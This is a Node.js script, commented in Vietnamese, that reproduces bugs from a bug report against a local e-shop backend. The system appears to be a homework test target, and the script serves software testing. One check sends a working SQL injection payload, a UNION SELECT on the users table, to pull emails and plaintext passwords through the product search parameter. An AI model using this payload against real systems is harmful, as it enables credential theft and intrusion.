// Chay lai duoc moi bug da bao trong bug-report.md bang request that vao backend
// dang chay o :3000. Muc dich: TA chi can chay MOT lenh la tai lap duoc tat ca.
//
// Cach goi:
//   node bug-report/verify-bugs.mjs

const API_URL = process.env.API_URL || "http://127.0.0.1:3000";
const FETCH_TIMEOUT_MS = 15000;

async function get(path) {
  const res = await fetch(`${API_URL}${path}`, { signal: AbortSignal.timeout(FETCH_TIMEOUT_MS) });
  const text = await res.text();
  let body;
  try { body = JSON.parse(text); } catch { body = text; }
  return { status: res.status, body, raw: text };
}

async function postJson(path, payload) {
  const res = await fetch(`${API_URL}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
  });
  const text = await res.text();
  let body;
  try { body = JSON.parse(text); } catch { body = text; }
  return { status: res.status, body, raw: text };
}

let confirmed = 0;
let total = 0;

function report(id, ok, detail) {
  total++;
  if (ok) confirmed++;
  console.log(`[${ok ? "CONFIRMED" : "NOT REPRODUCED"}] ${id}`);
  console.log(`  ${detail}`);
  console.log("");
}

async function main() {
  console.log(`== verify-bugs.mjs — API_URL=${API_URL} ==\n`);

  // BUG-P1: POST /api/register khong co UNIQUE tren email -> dang ky trung email
  // van thanh cong 2 lan, ra 2 id khac nhau, thay vi bao loi/tu choi.
  {
    const email = `verify-p1-${Date.now()}@hw05.test`;
    const r1 = await postJson("/api/register", { name: "Verify P1 A", email, password: "Test123!" });
    const r2 = await postJson("/api/register", { name: "Verify P1 B", email, password: "Different456!" });
    const ok = r1.status === 200 && r2.status === 200 && r1.body?.id && r2.body?.id && r1.body.id !== r2.body.id;
    report(
      "BUG-P1 (POST /api/register khong UNIQUE tren email)",
      ok,
      `Dang ky 2 lan cung email "${email}": lan 1 -> HTTP ${r1.status} id=${r1.body?.id}, ` +
      `lan 2 -> HTTP ${r2.status} id=${r2.body?.id}. Ky vong: lan 2 phai bi tu choi (409/400).`
    );
  }

  // BUG-P2: GET /api/products/:id voi id khong ton tai -> tra 200 + {} thay vi 404.
  {
    const r = await get("/api/products/999999999");
    const ok = r.status === 200 && typeof r.body === "object" && Object.keys(r.body).length === 0;
    report(
      "BUG-P2 (GET /api/products/:id tra 200+{} cho id khong ton tai)",
      ok,
      `GET /api/products/999999999 -> HTTP ${r.status}, body=${r.raw}. Ky vong: HTTP 404.`
    );
  }

  // BUG-P3: GET /api/products?search= noi chuoi SQL truc tiep -> SQL injection.
  // (a) dau nhay don lam vo cau truy van -> 500 kem thong bao loi SQL that (ro ri
  //     chi tiet he thong). (b) UNION SELECT dung so cot (6, khop bang products)
  //     rut duoc du lieu tu bang users — bao gom admin va mat khau dang plaintext.
  {
    const a = await get(`/api/products?search=${encodeURIComponent("a'")}`);
    const okA = a.status === 500 && /SQLITE_ERROR/i.test(a.raw);

    const payload = "zzz_no_match%' UNION SELECT 1,email,password,role,1,1 FROM users--";
    const b = await get(`/api/products?search=${encodeURIComponent(payload)}`);
    const leaked = Array.isArray(b.body) ? b.body.find((r) => r.name === "admin@eshop.com") : null;
    const okB = b.status === 200 && !!leaked;

    report(
      "BUG-P3a (search co dau nhay -> HTTP 500, ro ri thong bao loi SQL)",
      okA,
      `GET /api/products?search=a' -> HTTP ${a.status}, body="${a.raw.slice(0, 150)}"`
    );
    report(
      "BUG-P3b (UNION injection rut duoc bang users, gom ca admin)",
      okB,
      okB
        ? `Rut duoc ${b.body.length} dong tu bang users qua UNION SELECT. Vi du dong dau: ` +
          `email="${leaked.name}" password="${leaked.price}" (mat khau dang PLAINTEXT trong response)`
        : `Khong rut duoc du lieu — response: ${b.raw.slice(0, 200)}`
    );
  }

  // BUG-P5: GET /api/products khong phan trang -> payload qua lon o tap du lieu
  // lon. Kiem tra kich thuoc response thuc te thay vi lap lai su co OOM that.
  {
    const r = await get("/api/products");
    const sizeBytes = Buffer.byteLength(r.raw, "utf8");
    const ok = r.status === 200 && Array.isArray(r.body) && sizeBytes > 500_000;
    report(
      "BUG-P5 (GET /api/products khong phan trang, payload qua lon)",
      ok,
      `GET /api/products -> HTTP ${r.status}, ${Array.isArray(r.body) ? r.body.length : "?"} san pham, ` +
      `${sizeBytes.toLocaleString("vi-VN")} byte. Su co that da xay ra: luot Spike dau tien voi tu khoa ` +
      `quet toan bang (~3,6 MB/request) lam tien trinh backend bi OOM-kill (xem bug-report.md P5).`
    );
  }

  // BUG-P6: restart backend xoa sach DB — kiem tra TINH tren source that cua SUT,
  // tai truc tiep tu GitHub (khong phu thuoc duong dan cuc bo tren may nao ca).
  // KHONG thuc thi that (khong tu restart backend) vi se xoa du lieu dang dung.
  {
    let ok = false;
    let detail;
    try {
      const res = await fetch(
        "https://raw.githubusercontent.com/ttbhanh/eshop-sut/main/backend/database.js",
        { signal: AbortSignal.timeout(FETCH_TIMEOUT_MS) }
      );
      const src = await res.text();
      ok = res.status === 200 && /DROP TABLE/i.test(src) && /initDatabase/i.test(src);
      detail = ok
        ? `Tai source that tu GitHub (backend/database.js) — tim thay "DROP TABLE" ben trong ` +
          `initDatabase() duoc goi ngay luc module load, khong co dieu kien bao ve du lieu cu. ` +
          `KHONG thuc thi restart that o day vi se xoa DB dang dung — day la kiem tinh tren code.`
        : `Tai duoc source (HTTP ${res.status}) nhung khong khop pattern mong doi — can xem lai tay.`;
    } catch (e) {
      detail = `Khong tai duoc source tu GitHub de kiem (${e.message}) — bo qua, xem lai bang tay.`;
    }
    report("BUG-P6 (restart backend xoa sach DB — kiem tinh tren source that, khong thuc thi)", ok, detail);
  }

  console.log(`== Tong ket: ${confirmed}/${total} bug CONFIRMED ==`);
  process.exit(0);
}

main();
